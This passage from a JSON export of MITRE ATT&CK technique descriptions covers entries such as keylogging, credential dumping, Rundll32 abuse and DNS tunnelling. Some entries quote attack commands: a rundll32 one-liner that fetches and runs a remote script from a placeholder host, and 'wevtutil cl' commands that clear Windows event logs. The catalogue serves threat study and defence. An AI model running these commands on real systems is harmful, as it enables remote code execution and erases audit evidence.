expected traffic. \", \"modified\": \"2020-03-26T20:15:35.821Z\", \"id\": \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\"}, \"attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:44.421Z\", \"name\": \"External Remote Services\", \"attack_pattern_identifier\": \"T1133\", \"description\": \"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) can also be used externally.\\n\\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\", \"modified\": \"2020-06-19T20:07:09.600Z\", \"id\": \"attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d\"}, \"attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:58:11.791Z\", \"name\": \"Keylogging\", \"attack_pattern_identifier\": \"T1056.001\", \"description\": \"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\\n\\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\\n\\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\\n* Reading raw keystroke data from the hardware buffer.\\n* Windows Registry modifications.\\n* Custom drivers.\\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) \", \"modified\": \"2020-10-21T01:30:56.227Z\", \"id\": \"attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4\"}, \"attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:19.735Z\", \"name\": \"OS Credential Dumping\", \"attack_pattern_identifier\": \"T1003\", \"description\": \"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\\n\\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\\n\", \"modified\": \"2020-06-09T20:46:00.758Z\", \"id\": \"attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22\"}, \"attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-30T17:37:22.261Z\", \"name\": \"Application Access Token\", \"attack_pattern_identifier\": \"T1550.001\", \"description\": \"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\\n\\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\\n\\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \\\"refresh\\\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\\n\\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\", \"modified\": \"2020-09-16T19:40:02.024Z\", \"id\": \"attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51\"}, \"attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Trusted Relationship\", \"attack_pattern_identifier\": \"T1199\", \"description\": \"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\\n\\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.\", \"modified\": \"2020-07-14T19:38:14.299Z\", \"id\": \"attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925\"}, \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:32.662Z\", \"name\": \"Obfuscated Files or Information\", \"attack_pattern_identifier\": \"T1027\", \"description\": \"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \\n\\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \\n\\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\\n\\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) \", \"modified\": \"2020-09-16T19:24:20.601Z\", \"id\": \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\"}, \"attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:48.728Z\", \"name\": \"Process Discovery\", \"attack_pattern_identifier\": \"T1057\", \"modified\": \"2020-03-26T18:05:53.130Z\", \"description\": \"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.\", \"id\": \"attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580\"}, \"attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Exploit Public-Facing Application\", \"attack_pattern_identifier\": \"T1190\", \"description\": \"Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), network device administration and management protocols (like SNMP and Smart Install(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). \\n\\nIf an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies.\\n\\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)\", \"modified\": \"2020-10-21T01:10:54.358Z\", \"id\": \"attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c\"}, \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-01-23T17:46:59.535Z\", \"name\": \"Boot or Logon Autostart Execution\", \"attack_pattern_identifier\": \"T1547\", \"description\": \"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming)\\u00a0 These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\\n\\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.\", \"modified\": \"2020-10-09T16:05:36.772Z\", \"id\": \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\"}, \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:49.546Z\", \"name\": \"Command and Scripting Interpreter\", \"attack_pattern_identifier\": \"T1059\", \"description\": \"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\\n\\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.\", \"modified\": \"2020-10-22T16:43:39.362Z\", \"id\": \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\"}, \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:46.977Z\", \"name\": \"Scheduled Task/Job\", \"attack_pattern_identifier\": \"T1053\", \"modified\": \"2020-10-14T15:20:01.069Z\", \"description\": \"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\\n\\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).\", \"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\"}, \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-23T18:03:46.248Z\", \"name\": \"Rundll32\", \"attack_pattern_identifier\": \"T1218.011\", \"description\": \"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\\n\\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\\n\\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();GetObject(\\\"script:https[:]//www[.]example[.]com/malicious.sct\\\")\\\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\", \"modified\": \"2020-06-20T22:31:42.113Z\", \"id\": \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\"}, \"attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-15T16:27:31.768Z\", \"name\": \"DNS\", \"attack_pattern_identifier\": \"T1071.004\", \"description\": \"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) \", \"modified\": \"2020-10-21T16:26:34.196Z\", \"id\": \"attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72\"}, \"attack-pattern--f4c1826f-a322-41cd-9557-562100848c84\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-11T19:01:56.887Z\", \"name\": \"Modify Authentication Process\", \"attack_pattern_identifier\": \"T1556\", \"description\": \"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials. \\n\\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. \", \"modified\": \"2020-10-21T02:41:11.743Z\", \"id\": \"attack-pattern--f4c1826f-a322-41cd-9557-562100848c84\"}, \"attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-10-04T20:42:28.541Z\", \"name\": \"System Shutdown/Reboot\", \"attack_pattern_identifier\": \"T1529\", \"modified\": \"2020-03-27T21:18:48.149Z\", \"description\": \"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer.(Citation: Microsoft Shutdown Oct 2017) Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.\\n\\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)\", \"id\": \"attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc\"}, \"attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:22.767Z\", \"name\": \"Brute Force\", \"attack_pattern_identifier\": \"T1110\", \"description\": \"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\", \"modified\": \"2020-10-21T16:38:27.781Z\", \"id\": \"attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd\"}, \"attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"User Execution\", \"attack_pattern_identifier\": \"T1204\", \"modified\": \"2020-03-11T14:55:56.315Z\", \"description\": \"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\\n\\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\", \"id\": \"attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5\"}, \"attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-28T17:05:14.707Z\", \"name\": \"Clear Windows Event Logs\", \"attack_pattern_identifier\": \"T1070.001\", \"description\": \"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\\n\\nThe event logs can be cleared with the following utility commands:\\n\\n* <code>wevtutil cl system</code>\\n* <code>wevtutil cl application</code>\\n* <code>wevtutil cl security</code>\\n\\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001).\", \"modified\": \"2020-03-29T21:17:03.732Z\", \"id\": \"attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2\"}, \"attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:27:15.774Z\", \"name\": \"SSH\", \"attack_pattern_identifier\": \"T1021.004\", \"description\": \"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\\n\\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.(Citation: SSH Secure Shell)\", \"modified\": \"2020-03-23T23:43:46.977Z\", \"id\": \"attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6\"}, \"attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:45.139Z\", \"name\": \"System Network Connections Discovery\", \"attack_pattern_identifier\": \"T1049\", \"description\": \"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \\n\\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview)\\n\\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \\\"net use,\\\" and \\\"net session\\\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \\\"net session\\\".\", \"modified\": \"2020-03-15T14:15:32.910Z\", \"id\": \"attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475\"}, \"attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-24T14:07:56.276Z\", \"name\": \"Windows Management Instrumentation Event Subscription\", \"attack_pattern_identifier\": \"T1546.003\", \"description\": \"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. (Citation: Mandiant M-Trends 2015)\\n\\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018)\\n\\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.\", \"modified\": \"2020-05-05T12:02:45.522Z\", \"id\": \"attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58\"}, \"attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-13T20:26:49.433Z\", \"name\": \"Hidden Window\", \"attack_pattern_identifier\": \"T1564.003\", \"description\": \"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \\n\\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)\\n\\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\\n\\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)\", \"modified\": \"2020-03-29T22:49:43.557Z\", \"id\": \"attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0\"}, \"attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-10T17:44:59.787Z\", \"name\": \"Domain Generation Algorithms\", \"attack_pattern_identifier\": \"T1568.002\", \"description\": \"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\\n\\nDGAs can take the form of apparently random or \\u201cgibberish\\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\\n\\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)\", \"modified\": \"2020-10-02T01:37:39.618Z\", \"id\": \"attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd\"}, \"attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T21:08:26.480Z\", \"name\": \"Domain Account\", \"attack_pattern_identifier\": \"T1087.002\", \"description\": \"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\\n\\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.\", \"modified\": \"2020-03-26T13:42:34.402Z\", \"id\": \"attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af\"}, \"attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-10-01T02:14:18.044Z\", \"name\": \"Digital Certificates\", \"attack_pattern_identifier\": \"T1588.004\", \"description\": \"Before compromising a victim, adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\\n\\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Man-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise)\\n\\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)\\n\\nAdversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\", \"modified\": \"2020-10-22T18:18:54.959Z\", \"id\": \"attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421\"}, \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:25.584Z\", \"name\": \"Query Registry\", \"attack_pattern_identifier\": \"T1012\", \"description\": \"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\\n\\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\", \"modified\": \"2020-03-26T18:08:20.049Z\", \"id\": \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\"}, \"attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-19T16:54:28.516Z\", \"name\": \"Exchange Email Delegate Permissions\", \"attack_pattern_identifier\": \"T1098.002\", \"description\": \"Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018)\\n\\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)\", \"modified\": \"2020-05-04T19:18:36.254Z\", \"id\": \"attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306\"}, 